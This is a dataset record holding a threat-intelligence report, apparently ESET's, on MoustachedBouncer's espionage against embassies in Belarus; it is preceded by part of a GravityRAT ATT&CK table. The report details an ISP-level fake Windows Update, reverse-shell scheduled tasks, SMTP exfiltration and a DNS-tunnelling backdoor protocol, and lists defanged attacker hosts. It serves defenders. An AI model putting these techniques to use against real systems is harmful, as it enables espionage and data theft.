IMEI, IMSI, IP address, phone number, and country.\n| | | T1426 | System Information Discovery | GravityRAT extracts information about the device, including SIM serial number, device ID, and common system information.\n| | | Collection | T1533 | Data from Local System | GravityRAT exfiltrates files from the device.\n| | T1430 | Location Tracking | GravityRAT tracks device location.\n| | | T1636.002 | Protected User Data: Call Logs | GravityRAT extracts call logs.\n| | | T1636.003 | Protected User Data: Contact List | GravityRAT extracts the contact list.\n| | | T1636.004 | Protected User Data: SMS Messages | GravityRAT extracts SMS messages.\n| | | Command and Control | T1437.001 | Application Layer Protocol: Web Protocols | GravityRAT uses HTTPS to communicate with its C&C server.\n| | Exfiltration | T1646 | Exfiltration Over C2 Channel | GravityRAT exfiltrates data using HTTPS.\n| | Impact | T1641 | Data Manipulation | GravityRAT removes files with particular extensions from the device, and deletes all user call logs and the contact list.\n|","num_sentences":91,"metadata":{"source":"blog","platform":"welivesecurity","filename":"gravityrat"}}
{"id":210,"title":"MoustachedBouncer: Espionage against foreign diplomats in Belarus","publish_date":"2023-08-10","link":"https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/","clean_text":"MoustachedBouncer is a cyberespionage group discovered by ESET Research and first publicly disclosed in this blogpost.\nThe group has been active since at least 2014 and only targets foreign embassies in Belarus.\nSince 2020, MoustachedBouncer has most likely been able to perform adversary-in-the-middle (AitM) attacks at the ISP level, within Belarus, in order to compromise its targets.\nThe group uses two separate toolsets that we have named NightClub and Disco.\nKey points of this report: - MoustachedBouncer has been operating since at least 2014. -\nWe assess with medium confidence that they are aligned with Belarus's interests. -\nMoustachedBouncer specializes in the espionage of foreign embassies in Belarus. -\nMoustachedBouncer has used the adversary-in-the-middle technique since 2020 to redirect captive portal checks to a C&C server and deliver malware plugins via SMB shares. -\nWe believe that MoustachedBouncer uses a lawful interception system (such as SORM) to conduct its AitM operations. -\nWe assess with low confidence that MoustachedBouncer is closely cooperating with Winter Vivern, another group targeting European diplomats but using different TTPs. -\nSince 2014, the group has been operating a malware framework that we have named NightClub.\nIt uses the SMTP and IMAP (email) protocols for C&C communications. -\nStarting in 2020, the group has been using, in parallel, a second malware framework we have named Disco. -\nBoth NightClub and Disco support additional spying plugins including a screenshotter, an audio recorder, and a file stealer.\nThe group's intricate tactics, techniques and procedures were also discussed on the ESET Research Podcast.\nJust press play to learn more from ESET's Director of Threat Research Jean-Ian Boutin and ESET Distinguished Researcher Aryeh Goretsky.\nVictimology According to ESET telemetry, the group targets foreign embassies in Belarus, and we have identified four different countries whose embassy staff have been targeted: two from Europe, one from South Asia, and one from Africa.\nThe key dates are shown in Figure 1.\nAttribution While we track MoustachedBouncer as a separate group, we have found elements that make us assess with low confidence that they are closely collaborating with another group known as Winter Vivern.\nThe latter was discovered in 2021 and is still active as of 2023.\nIn March 2023, Winter Vivern used a known XSS vulnerability (CVE-2022-27926) in the Zimbra mail portal in order to steal webmail credentials of diplomats of several European countries.\nThis campaign was publicly disclosed by Proofpoint researchers.\nMoustachedBouncer’s activity spans from 2014 to 2022 and the TTPs of the group have evolved over time.\nFor example, we have first seen them use AitM attacks only in 2020.\nHowever, the targeted vertical has stayed the same.\nTable 1 shows the characteristics of each campaign.\nGiven these elements, we assess with high confidence that they are all linked to MoustachedBouncer.\nTable 1.\nConnections between the MoustachedBouncer campaigns | | VirusTotal | Victim A (2017) | Victim B | Victim C | Victim D | | NightClub implant | X | X | | X | | | NightClub plugins | | X | X | X | | | Disco implant | | | X | | X | | SharpDisco dropper | | | X | | | | Compromise via AitM | ?\n| ?\n| ?\n| ?\n| X | | Malware delivery via AitM on SMB shares | | | X | | X | | Victims: foreign embassies in Belarus | ?\n| X | X | X | X | Compromise vector: AitM In this section, we detail the initial access for Disco.\nWe don’t yet know the initial access method MoustachedBouncer uses to install NightClub.\nFake Windows Update To compromise their targets, MoustachedBouncer operators tamper with their victims’ internet access, probably at the ISP level, to make Windows believe it’s behind a captive portal.\nWindows 10 checks whether it’s able to access the internet with an HTTP request to http://www.msftconnecttest.com/connecttest.txt.\nIn case the answer is not Microsoft Connect Test, a browser window is opened to http://www.msftconnecttest.com/redirect .\nFor IP ranges targeted by MoustachedBouncer, the network traffic is tampered at the ISP level, and the latter URL redirects to a seemingly legitimate, but fake, Windows Update URL, http://updates.microsoft[.]com/. Hence, the fake Windows Update page will be displayed to a potential victim upon network connection.\nThe fake update page is shown in Figure 2.\nThe text we observed is in Russian, most likely because that is the main language used in Belarus, but it is possible that versions in other languages exist.\nThe page indicates that there are critical system security updates that must be installed.\nNote that it is using unencrypted HTTP and not HTTPS, and that the updates.microsoft[.]com subdomain does not exist on Microsoft’s nameservers, so it does not resolve on the open internet.\nDuring the attack, this domain resolved to 5.45.121[.]106 on the target’s machine.\nThis IP address is used for parking domains and is unrelated to Microsoft.\nAlthough this is an internet-routable IP address, traffic to this IP never reaches the internet while the AitM attack is ongoing.\nBoth the DNS resolutions and the HTTP replies were injected in transit, probably at the ISP level.\nAn important point is that the adversary-in-the-middle (AitM) technique only occurs against a few selected organizations (perhaps just embassies), not countrywide.\nIt is not possible to reproduce the redirection by simply exiting from a random IP address in Belarus.\nMalware delivery The HTML page, shown in Figure 2, loads JavaScript code from http://updates.microsoft[.]com/jdrop.js.\nThis script first calls setTimeout to execute the function jdrop one second after the page has loaded.\nThat function (see Figure 3) displays a modal window with a button named Получить обновления (translation: Get updates).\nA click on the button executes the update function, shown in Figure 4.\nThis function triggers the download of a fake Windows Update installer from the legitimate-seeming URL http://updates.microsoft[.]com/MicrosoftUpdate845255.zip.\nIt also displays some instructions to install the update: Для установки обновлений, скачайте и запустите \"MicrosoftUpdate845255.msi\". (\ntranslation: To install updates, download and run \"MicrosoftUpdate845255.msi\").\nWe were unable to retrieve the downloaded MicrosoftUpdate845255.zip file but our telemetry shows it contains a malicious executable named MicrosoftUpdate845255.exe.\nWritten in Go, it creates a scheduled task that executes \\\\35.214.56[.]2\\OfficeBroker\\OfficeBroker.exe every minute.\nLike the path suggests, it fetches the executable via SMB from 35.214.56[.]2.\nThis IP address belongs to a Google Cloud customer, but just like the HTTP server, we believe that SMB replies are injected on the fly via AitM and that the attackers don’t control the actual internet-routable IP address.\nWe have also observed the following SMB servers, intercepted via AitM: - \\\\209.19.37[.]184 - \\\\38.9.8[.]78 - \\\\59.6.8[.]25 We have observed this behavior in two separate ISP networks: Unitary Enterprise A1 and Beltelecom.\nThis suggests that those ISPs may not provide full data confidentiality and integrity.\nWe strongly recommend that foreign organizations in Belarus use an end-to-end encrypted VPN tunnel, ideally out-of-band (i.e., not from the endpoint), providing internet connectivity from a trusted network.\nFigure 5 depicts our hypothesis about the compromise vector and the traffic interception.\nAitM – General thoughts The AitM scenario reminds us of the Turla and StrongPity threat actors who have trojanized software installers on the fly at the ISP level.\nUsually, this initial access method is used by threat actors operating in their own country because it requires significant access inside the internet service providers, or their upstream providers.\nIn many countries, security services are allowed to perform so-called “lawful interception” using special devices installed on the ISPs’ premises.\nIn Russia, a law from 2014 requires ISPs to install devices called SORM-3 that enable the Federal Security Service (FSB) to conduct targeted surveillance.\nThe devices have deep packet inspection (DPI) capabilities and were likely used by Turla in its Mosquito campaign.\nIn 2018, the Citizen Lab revealed that DPI devices developed by the Canadian company Sandvine were used to modify HTTP traffic in Turkey and Egypt.\nIn Turkey, the devices were allegedly used to redirect internet users to a malicious server when they tried to download certain Windows applications, which is in line with StrongPity activities.\nIn Egypt, those devices were allegedly used to inject ads and cryptocurrency mining scripts in order to generate money.\nIn 2020, a Bloomberg article revealed that Belarus’s National Traffic Exchange Center bought the same Sandvine DPI equipment, but according to a Cyberscoop article the contract was cancelled in September 2020.\nAccording to a report by Amnesty International published in 2021, “Under Belarusian law, all telecommunications providers in the country must make their hardware compatible with the SORM system”.\nThey also state that “The SORM system allows the authorities direct, remote-control access to all user communications and associated data without notifying the provider”.\nWe assess with low confidence that MoustachedBouncer uses this SORM system to conduct its operations.\nWhile the compromise of routers in order to conduct AitM on embassy networks cannot be fully discarded, the presence of lawful interception capabilities in Belarus suggests the traffic mangling is happening at the ISP level rather than on the targets’ routers.\nImplants: NightClub and Disco Since 2014, the malware families used by MoustachedBouncer have evolved, and a big change happened in 2020 when the group started to use AitM attacks.\nAt the same time, it started to use much simpler tools developed in .NET and Go.\nIn reference to NightClub, we named this new toolset Disco.\nMoustachedBouncer operates the two implant families in parallel, but on a given machine, only one is deployed at a time.\nWe believe that Disco is used in conjunction with AitM attacks while NightClub is used for victims where traffic interception at the ISP level isn’t possible because of a mitigation such as the use of an end-to-end encrypted VPN where internet traffic is routed outside of Belarus.\nDisco As mentioned in the previous section, a fake Windows Update page delivers the first stage (SHA-1: E65EB4467DDB1C99B09AE87BA0A964C36BAB4C30).\nThis is a simple dropper written in Go that creates a scheduled task to execute \\\\35.214.56[.]2\\OfficeBroker\\OfficeBroker.exe every minute.\nOfficeBroker.exe is downloaded over the SMB protocol via AitM attack.\nThe dropper’s main function is shown in Figure 6.\nFinally, the dropper does a DNS query for windows.system.update[.]com.\nThis domain does not exist but the DNS request is probably intercepted via AitM, and is likely a beacon to notify the operators that the machine has been successfully compromised.\nWe were unable to retrieve the OfficeBroker.exe file, but it is very likely that it acts as a downloader, since we have observed further plugins being executed from SMB shares.\nThe plugins are developed in Go and are rather simple because they mostly rely on external Go libraries.\nTable 2 summarizes the different plugins.\nTable 2.\nGo plugins used by MoustachedBouncer in 2021–2022 | Download URL / Path on disk | Description | | \\\\209.19.37[.]184\\driverpack\\aact.exe | Takes screenshots using the kbinani/screenshot library.\nScreenshots are saved in .\\AActdata\\ | | C:\\Users\\Public\\driverpack\\driverpackUpdate.exe | Executes PowerShell scripts with powershell.exe -NoProfile -NonInteractive | | C:\\Users\\Public\\driverpack\\sdrive.exe | Executes C:\\Users\\Public\\driverpack\\driverpackUpdate.exe (the plugin above) using elevated rights via CVE-2021-1732.\nThe code was likely inspired by a PoC on GitHub and uses the zydis code generation library.\n| | \\\\209.19.37[.]184\\driverpack\\officetelemetry.exe | A reverse proxy strongly inspired by the GitHub repository revsocks.\nWe were unable to retrieve the command line parameters with the proxy IP address.\n| | \\\\38.9.8[.]78\\driverpack\\DPU.exe | Another sample of the PowerShell plugin.\n| | %userprofile%\\appdata\\nod32update\\nod32update.exe | Another sample of the reverse proxy plugin.\n| | \\\\59.6.8[.]25\\outlooksync\\outlooksync.exe | Takes screenshots; it is similar to the first plugin.\nImages are saved in ./logs/${DATETIME}.dat.\n| | \\\\52.3.8[.]25\\oracle\\oracleTelemetry.exe | Screenshot plugin packed with Themida.\n| Interestingly, the plugins also use SMB shares for data exfiltration.\nThere is no C&C server outside the attackers’ premises to look at or to take down.\nThere also seems to be no way to reach that C&C server from the internet.\nThis gives high resiliency to the attackers’ network infrastructure.\nSharpDisco and NightClub plugins In January 2020 we observed a MoustachedBouncer dropper, which we named SharpDisco, being downloaded from https://mail.mfa.gov.\nSharpDisco (SHA-1: A3AE82B19FEE2756D6354E85A094F1A4598314AB) SharpDisco is a dropper developed in C#.\nIt displays a fake update window, shown in Figure 7, while creating two scheduled tasks in the background.\nThese scheduled tasks are: WINCMDA.EXE and WINCMDB.EXE are probably just cmd.exe renamed.\nEvery minute, the task reads what is in \\\\24.9.51[.]94\\EDGEUPDATE\\EDGEAIN (on the SMB share), pipes it to cmd.exe, and writes the output to \\\\24.9.51[.]94\\EDGEUPDATE\\EDGEAOUT.\nIt is the same for the second task, but with the EDGEBIN and EDGEBOUT files.\nFrom a higher viewpoint, those tasks are reverse shells with a one-second latency.\nThen, as shown in Figure 8, the dropper sends a DNS request for an unregistered domain, edgeupdate-security-windows[.]com.\nThis is similar to what the 2022 Disco dropper does.\nESET telemetry shows that the reverse shell was used to drop a genuine Python interpreter in C:\\Users\\Public\\WinTN\\WinTN.exe.\nWe then observed two plugins being dropped on disk by cmd.exe, which means they were likely dropped by the reverse shell as well.\nThe two plugins are: - A recent-files stealer in C:\\Users\\Public\\WinSrcNT\\It11.exe - An external drive monitor in C:\\Users\\Public\\It3.exe It is interesting to note that those plugins share code with NightClub (described in the section NightClub – 2017 (SHA-1: F92FE4DD679903F75ADE64DC8A20D46DFBD3B277) below).\nThis allowed us to link the Disco and NightClub toolsets.\nRecent-files stealer (SHA-1: 0DAEA89F91A55F46D33C294CFE84EF06CE22E393) This plugin is a Windows executable named It11.exe.\nWe believe it was executed via the reverse shell mentioned above.\nThere is no persistence mechanism implemented in the plugin.\nIt gets the files recently opened on the machine by reading the content of the folder %USERPROFILE%\\Recent (on Windows XP) or of %APPDATA%\\Microsoft\\Windows\\Recent (in newer Windows versions).\nThose folders contain LNK files, each pointing to a recently opened file.\nThe plugin embeds its own LNK format parser in order to extract the path to the original file.\nWe were unable to make this plugin work, but static analysis shows that the files are exfiltrated to the SMB share \\\\24.9.51[.]94\\EDGEUPDATE\\update\\. The plugin maintains a list of already exfiltrated files, and their CRC-32 checksum, in %TEMP%\\index.dat.\nThis likely avoids retransmitting the same file more than once.\nExternal drive monitor (SHA-1: 11CF38D971534D9B619581CEDC19319962F3B996) This plugin is a Windows executable named It3.exe.\nAs with the recent-files stealer, it doesn’t implement any persistence mechanism.\nThe plugin calls GetLogicalDrives in a loop to get a list of all connected drives, including removable ones such as USB keys.\nThen, it does a raw copy of the NTFS volume of each removable drive and writes it in the current working directory, C:\\Users\\Public\\ in our example.\nThe filename is a randomly generated string of six to eight alphanumeric characters, for example heNNYwmY. It maintains a log file in The plugin doesn’t appear to have any exfiltration capabilities.\nIt is likely that the staged drive dumps are later retrieved using the reverse shell.\nNightClub Since 2014, MoustachedBouncer has been using a malware framework we named NightClub because it contains a C++ class named nightclub.\nWe found samples from 2014, 2017, 2020, and 2022.\nThis section describes the evolution of NightClub from a simple backdoor to a fully modular C++ implant.\nIn summary, NightClub is an implant family using emails for its C&C communications.\nSince 2016, additional modules could be delivered by email to extend its spying capabilities.\nNightClub – 2014 This is the oldest known version of NightClub.\nWe found a dropper and an orchestrator.\nThe dropper (SHA-1: 0401EE7F3BC384734BF7E352C4C4BC372840C30D) is an executable named EsetUpdate-0117583943.exe, and it was uploaded to VirusTotal from Ukraine on 2014-11-19.\nWe don’t know how it was distributed at that time.\nThe main function, illustrated in Figure 9, loads the resource MEMORY and writes its content in %SystemRoot%\\System32\\creh.dll.\nIt is stored in cleartext in the PE resource.\nThen, the dropper modifies the Creation, Access, and Write timestamps of creh.dll to those of the genuine Windows DLL user32.dll.\nFinally, it creates a Windows service named WmdmPmSp and sets, in the registry, its ServiceDll to %SystemRoot%\\System32\\creh.dll – see Figure 10.\nThe previously dropped DLL, creh.dll (SHA-1: 5B55250CC0DA407201B5F042322CFDBF56041632) is the NightClub orchestrator.\nIt has a single export named ServiceMain and its PDB path is D:\\Programming\\Projects\\Work\\SwampThing\\Release\\Win32\\WorkingDll.pdb.\nIt is written in C++ and the names of some methods and classes are present in the RTTI data – see Figure 11.\nSome of the strings are encrypted using the following linear congruential generator (LCG): staten+1 = (690069 × staten + 1) mod 232.\nFor each encrypted string, a seed (state0) between 0 and 255 is provided.\nTo decrypt a string, the staten is subtracted from each encrypted byten.\nAn example of an encrypted string structure is shown in Figure 12.\nA non-encrypted log file is present in C:\\Windows\\System32\\servdll.log.\nIt contains very basic information about the initialization of the orchestrator – see Figure 13.\nNightClub has two main capabilities: • Monitoring files • Exfiltrating data via SMTP (email) File monitor Functionality implemented here is very close to that of the recent file monitor plugin seen in 2020 and described above.\nIt also browses the directories %USERPROFILE%\\Recent on Windows XP, and in newer Windows versions %APPDATA%\\Microsoft\\Windows\\Recent, and implements the same LNK parser – see Figure 14 and Figure 15.\nThe files retrieved from the LNK files are copied to %TEMP%\\ It also monitors removable drives in a loop, in order to steal files from them.\nSMTP C&C communications NightClub uses the SMTP protocol to exfiltrate data.\nEven if C&C communication by email is not unique to MoustachedBouncer and is also used by other adversaries such as Turla (see LightNeuron and the Outlook backdoor), it is quite rare.\nThe code is based on the CSmtp project available on GitHub.\nThe email accounts’ information is hardcoded, encrypted with the LCG algorithm.\nIn the sample we analyzed, the mail configuration is: • SMTP server: smtp.seznam.cz • Sender address: glen.morriss75@seznam[.]cz • Sender password: • Recipient address: SunyaF@seznam[.]cz seznam.cz is a Czech web portal offering a free webmail service.\nWe believe the attackers created their own email accounts, instead of compromising legitimate ones.\nNightClub exfiltrates the files previously copied to %TEMP% by the file monitor functionality (FileMonitor in Figure 11).\nThey’re encoded in base64 and added as an attachment.\nThe attachment name is the original filename with the .bin extension.\nFigure 16 shows the exfiltration of a file via SMTP.\nNightClub authenticates using the credentials for the glen.morriss75@seznam[.]cz account and sends an email to SunyaF@seznam[.]cz with the stolen file attached.\nNote that some headers that might look suspicious at first sight are the defaults from the CSmtp project, so they are probably not distinctive.\nThese include: • X-Mailer: The Bat! (\nv3.02) Professional • Content-Type: multipart/mixed; boundary=\"__MESSAGE__ID__54yg6f6h6y456345\" The Bat!\nis an email client widely used in Eastern Europe.\nAs such, the X-Mailer header likely blends in with email traffic in Belarus.\nNightClub – 2017 (SHA-1: F92FE4DD679903F75ADE64DC8A20D46DFBD3B277) In 2017, we found a more recent version of NightClub, which was compiled on 2017-06-05.\nOn the victim’s machine, it was located at C:\\Windows\\System32\\metamn.dll.\nIts filename in the DLL export directory is DownloaderService.dll, and it has a single export named ServiceMain.\nIt contains the PDB path D:\\AbcdMainProject\\Rootsrc\\Projects\\MainS\\Ink\\Release\\x64\\EtfFavoriteFinder.pdb.\nTo persist, it creates a Windows service named WmdmPmSp, as in previous versions.\nUnfortunately, we have not been able to recover the dropper.\nThis NightClub version also includes a few C++ class and method names, including nightclub, in the RTTI data – see Figure 17.\nAs in previous versions, C&C communications use the SMTP protocol, via the CSmtp library, with hardcoded credentials.\nIn the sample we analyzed, the mail configuration is: • SMTP server: smtp.mail.ru • Sender address: fhtgbbwi@mail[.]ru • Sender password: [redacted] • Recipient address: nvjfnvjfnjf@mail[.]ru The main difference is that they switched the free email provider from Seznam.cz to Mail.ru.\nThis NightClub version uses external plugins stored in the folder %APPDATA%\\NvmFilter\\. They are DLLs named Keylogger (SHA-1: 6999730D0715606D14ACD19329AF0685B8AD0299) This plugin was stored in %APPDATA%\\NvmFilter\\et2z7q0FREZ.cr and is a DLL with one export, Starts.\nIt contains the PDB path D:\\Programming\\Projects\\Autogen\\Kh\\AutogenAlg\\Release\\x64\\SearchIdxDll.pdb and was developed in C++.\nRTTI data shows a few class names – see Figure 18.\nThe keylogger implementation is rather traditional, using the Windows GetKeyState API function – see Figure 19.\nThe keylogger maintains a cleartext log file in %TEMP%\\uirtl.tmp.\nIt contains the date, the title of the application, and the logged keystrokes for this specific application.\nAn example, which we generated, is provided in Figure 20.\nFile monitor (SHA-1: 6E729E84C7672F048ED8AE847F20A0219E917FA) This plugin was stored in %APPDATA%\\NvmFilter\\sTUlsWa1.cr and is a DLL with a single export named Starts.\nIts PDB path, D:\\Programming\\Projects\\Autogen\\Kh\\AutogenAlg\\Release\\x64\\FileMonitoringModule.pdb, has not been stripped, and it reuses code from the 2014 and 2020 file monitors, described above.\nIt monitors drives and recent files, and copies files for exfiltration to %TEMP%\\AcmSym\\rm.\nIts log file is stored in %TEMP%\\indexwti.sxd.\nNightClub – 2020–2022 In 2020-11, we observed a new version of NightClub deployed in Belarus, on the computers of the diplomatic staff of a European country.\nIn 2022-07, MoustachedBouncer again compromised some of the same computers.\nThe 2020 and 2022 versions of NightClub are almost identical, and the compromise vector remains unknown.\nIts architecture is slightly different from the previous versions, as the orchestrator also implements networking functions.\nThe second component, which its developers call the module agent, is only responsible for loading the plugins.\nAll samples were found in the folder %APPDATA%\\microsoft\\def\\ and are written in C++ with statically linked libraries such as CSmtp or cpprestsdk.\nAs a result, the executables are quite large – around 5MB.\nOrchestrator On the victims’ machines, both orchestrator variants (SHA-1: 92115E21E565440B1A26ECC20D2552A214155669 and D14D9118335C9BF6633CB2A41023486DACBEB052) were named svhvost.exe.\nWe believe MoustachedBouncer tried to masquerade as the name of the legitimate executable svchost.exe.\nFor persistence, it creates a service named vAwast.\nContrary to previous versions, to encrypt the strings they simply add 0x01 to each byte.\nFor example, the string cmd.exe would be encrypted as dne/fyf.\nAnother difference is that the configuration is stored in an external file, rather than hardcoded in the binary.\nIt is stored in the hardcoded path %APPDATA%\\Microsoft\\def\\Gfr45.cfg and the data is decrypted with a private 2048-bit RSA key (see Figure 21) using the function BCryptImportKeyPair and BCryptDecrypt.\nThe config is formatted in JSON, as shown in Figure 22.\nThe most important keys are transport and modules.\nThe former contains information about the mailbox used for C&C communications, as in the previous versions.\nThe latter contains the list of modules.\nModule agent The two variants of the module agent (SHA-1: DE0B38E12C0AF0FD63A67B03DD1F8C1BF7FA6128 and E6DE72516C1D4338D7E45E028340B54DCDC7A8AC) were named schvost.exe, which is another imitation of the svchost.exe filename.\nThis component is responsible for starting the modules that are specified in the configuration.\nThey are DLLs, each with an export named Start or Starts.\nThey are stored on disk unencrypted with the .ini extension, but actually are DLLs.\nModules Over the course of our investigation, we found five different modules: an audio recorder, two almost identical screenshotters, a keylogger, and a DNS backdoor.\nFor all of them: their configuration, which is formatted in JSON, is passed as an argument to the Start or Starts function.\nBy default, the output of the plugin is written in %TEMP%\\tmp123.tmp.\nThis can be changed using the config field file.\nTable 3 shows the different plugins.\nTable 3.\nNightClub plugins | DLL export name | Configuration | Description | | NotifyLoggers.dll | { \"name\":\" \"enabled\":\" \"max_size\":\" \"file\":\" \"chk_t\":\" \"r_d\":\" \"f_hs\":\" \"t_hs\":\" } | An audio recorder that uses the Lame library, and mciSendStringW to control the audio device.\nThe additional configuration fields are likely used to specify options for Lame.\n| | MicroServiceRun.dll | { \"name\":\" \"enabled\":\" \"max_size\":\" \"file\":\" \"period_in_sec\":\" \"quality\":\" \"app_keywords\":\" } | A screenshotter that uses CreateCompatibleDC and GdipSaveImageToStream and writes captured images in file to disk.\nIf app_keywords is not empty, it uses GetForegroundWindow to check the name of the active Window and capture it only if it matches app_keywords.\n| | JobTesterDll.dll | { \"name\":\" \"enabled\":\" \"max_size\":\" \"file\":\" } | A keylogger that uses the GetKeyState API.\nIt writes the log in file to disk and the format is | | ParametersParserer.dll | { \"name\":\" \"enabled\":\" \"max_size\":\" \"file\":\" \"cc_server_address\":\" } | A DNS-tunneling backdoor.\ncc_server_address specifies the IP address of a DNS server to which requests are sent.\nMore details follow.\n| The DNS-tunneling backdoor (ParametersParserer.dll) uses a custom protocol to send and receive data from a malicious DNS server (cc_server_address).\nFigure 23 shows that the DNS request is sent to the IP address provided in the configuration, using the pExtra parameter of DnsQuery_A. The plugin adds the data to exfiltrate as part of the subdomain name of the domain that is used in the DNS request (pszName above).\nThe domain is always 11.1.1.cid and the data is contained in the subdomain.\nIt uses the following format, where x is the letter, not some variable: x + For example, the first DNS request the plugin sends is xZW1wdHkx.11.1.1.cid, where ZW1wdHk decodes to empty.\nNote that the base64 function is not standard.\nIt removes the =, if any, from the result of the base64 encoding, and also replaces / characters with -s and + characters with -p.\nThis is to create valid subdomains, because standard base64 encoding output can include +, / and = characters, all of which are invalid in domain names and could be detected in network traffic.\nThen, the plugin reads the result that should be one or many TXT DNS records, since the flag DNS_TYPE_TEXT is passed to DnsQuery_A. Microsoft names the underlying structure DNS_TXT_DATAA.\nIt contains an array of strings, which are concatenated to compute the output buffer.\nThe expected format of the reply is: x + This is similar to the format of the requests.\nThe For example, if the operators wanted to execute calc.exe, the DNS C&C server would send the reply xYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQx.27.2.1.calc, where Yzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQ decodes to c:\\windows\\system32\\calc.exe and 27 is the command ID to create a new process.\nAll commands supported by this backdoor are detailed in Table 4.\nTable 4.\nCommands implemented by the DNS backdoor | ID | Description | | 0x15 (21) | Copy a directory (from a source to a destination) | | 0x16 (22) | Move a file (from a source to a destination) | | 0x17 (23) | Remove a file or a directory | | 0x18 (24) | Search a file for a given pattern (Note: we are unsure about the exact behavior of this command) | | 0x19 (25) | Write a buffer to a file | | 0x1A (26) | Read a file | | 0x1B (27) | Create a process | The result of the commands is exfiltrated back to the attacker using DNS requests, as detailed above.\nThe only difference is that 11 is replaced by 12 in the domain name, as shown in this example: xdGltZW91dAx.12.1.1.cid.\nIn this case, the plugin sent the message timeout to the C&C server.\nConclusion MoustachedBouncer is a skilled threat actor targeting foreign diplomats in Belarus.\nIt uses quite advanced techniques for C&C communications including network interception at the ISP level for the Disco implant, emails for the NightClub implant, and DNS in one of the NightClub plugins.\nThe main takeaway is that organizations in foreign countries where the internet cannot be trusted should use an end-to-end encrypted VPN tunnel to a trusted location for all their internet traffic in order to circumvent any network inspection devices.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nESET Research Podcast If you want to know how ESET researchers named MoustachedBouncer and its tools Disco and NightClub, what makes this group worthy of the “advanced” label, or if employees of the targeted embassies could have brought the malware home from work, then listen to the latest episode of the ESET Research podcast.\nESET’s Director of Threat Research Jean-Ian Boutin explains the intricacies of MoustachedBouncer to our host and ESET Distinguished Researcher Aryeh Goretsky.\nIf you enjoy listening to cybersecurity topics, subscribe to our ESET Research podcast on Spotify, Google Podcasts, Apple Podcasts, or PodBean.\nIoCs Files | SHA-1 | Filename | Detection | Description | | 02790DC4B276DFBB26C714F29D19E53129BB6186 | index.html | JS/TrojanDownloader.\nAgent.\nYJJ | Fake Windows update webpage.\n| | 6EFF58EDF7AC0FC60F0B8F7E22CFE243566E2A13 | jdrop.js | JS/TrojanDownloader.\nAgent.\nYJJ | JavaScript code that triggers the download prompt of the fake Windows update.\n| | E65EB4467DDB1C99B09AE87BA0A964C36BAB4C30 | MicrosoftUpdate845255.exe | WinGo/Agent.\nET | Disco dropper.\n| | 3A9B699A25257CBD0476CB1239FF9B25810305FE | driverpackUpdate.exe | WinGo/Runner.\nB | Disco plugin.\nExecutes PowerShell scripts.\n| | 19E3D06FBE276D4AAEA25ABC36CC40EA88435630 | DPU.exe | WinGo/Runner.\nC | Disco plugin.\nExecutes PowerShell scripts.\n| | 52BE04C420795B0D9C7CD1A4ACBF8D5953FAFD16 | sdrive.exe | Win64/Exploit.\nCVE-2021-1732.I | Disco plugin.\nLPE exploit for CVE-2021-1732.\n| | 0241A01D4B03BD360DD09165B59B63AC2CECEAFB | nod32update.exe | WinGo/Agent.\nEV | Disco plugin.\nReverse proxy based on revsocks.\n| | A01F1A9336C83FFE1B13410C93C1B04E15E2996C | aact.exe | WinGo/Spy.\nAgent.\nW | Disco plugin.\nTakes screenshots.\n| | C2AA90B441391ADEFAA3A841AA8CE777D6EC7E18 | officetelemetry.exe | WinGo/Agent.\nBT | Disco plugin.\nReverse proxy based on revsocks.\n| | C5B2323EAE5E01A6019931CE35FF7623DF7346BA | oracleTelemetry.exe | WinGo/Spy.\nAgent.\nW | Disco plugin packed with Themida.\nTakes screenshots.\n| | C46CB98D0CECCB83EC7DE070B3FA7AFEE7F41189 | outlooksync.exe | WinGo/Spy.\nAgent.\nW | Disco plugin.\nTakes screenshots.\n| | A3AE82B19FEE2756D6354E85A094F1A4598314AB | kb4480959_EdgeUpdate.exe | MSIL/TrojanDropper.\nAgent.\nFKQ | Disco .NET dropper.\n| | 4F1CECF6D05571AE35ED00AC02D5E8E0F878A984 | WinSrcNT.exe | Win32/Nightclub.\nB | NightClub plugin used by Disco.\nSteals recent files.\n| | 0DAEA89F91A55F46D33C294CFE84EF06CE22E393 | It11.exe | Win32/Nightclub.\nB | NightClub plugin used by Disco.\nSteals recent files.\n| | 11CF38D971534D9B619581CEDC19319962F3B996 | It3.exe | Win32/Nightclub.\nB | NightClub plugin used by Disco.\nMakes raw dumps of removable drives.\n| | F92FE4DD679903F75ADE64DC8A20D46DFBD3B277 | metamn.dll | Win64/Nightclub.\nB | NightClub (2017 version).\n| | 6999730D0715606D14ACD19329AF0685B8AD0299 | et2z7q0FREZ.cr | Win64/Nightclub.\nB | NightClub plugin.\nKeylogger.\n| | 6E729E84C7672F048ED8AE847F20A0219E917FA3 | sTUlsWa1.cr | Win64/Nightclub.\nA | NightClub plugin.\nFile stealer.\n| | 0401EE7F3BC384734BF7E352C4C4BC372840C30D | EsetUpdate-0117583943.exe | Win32/Nightclub.\nC | NightClub dropper.\n| | 5B55250CC0DA407201B5F042322CFDBF56041632 | creh.dll | Win32/Nightclub.\nC | NightClub (2014).\n| | D14D9118335C9BF6633CB2A41023486DACBEB052 | svhvost.exe | Win32/Nightclub.\nD | Orchestrator (NightClub).\n| | E6DE72516C1D4338D7E45E028340B54DCDC7A8AC | schvost.exe | Win32/Nightclub.\nD | Module agent (NightClub).\n| | 3AD77281640E7BA754E9B203C8B6ABFD3F6A7BDD | nullnat.ini | Win32/Nightclub.\nD | Backdoor with DNS tunneling (NightClub plugin).\n| | 142FF0770BC6E3D077FBB64D6F23499D9DEB9093 | soccix.ini | Win32/Nightclub.\nD | Keylogger (NightClub plugin).\n| | FE9527277C06D7F986161291CE7854EE79788CB8 | oreonion.ini | Win32/Nightclub.\nD | Screenshotter (NightClub plugin).\n| | 92115E21E565440B1A26ECC20D2552A214155669 | svhvost.exe | Win32/Nightclub.\nD | Orchestrator (NightClub).\n| | DE0B38E12C0AF0FD63A67B03DD1F8C1BF7FA6128 | schvost.exe | Win32/Nightclub.\nD | Module agent (NightClub).\n| | D2B715A72BBA307CC9BF7690439D34F62EDF1324 | sysleg.ini | Win32/Nightclub.\nD | Records audio (NightClub plugin).\n| | DF8DED42F9B7DE1F439AEC50F9C2A13CD5EB1DB6 | oreonion.ini | Win32/Nightclub.\nD | Takes screenshots (NightClub 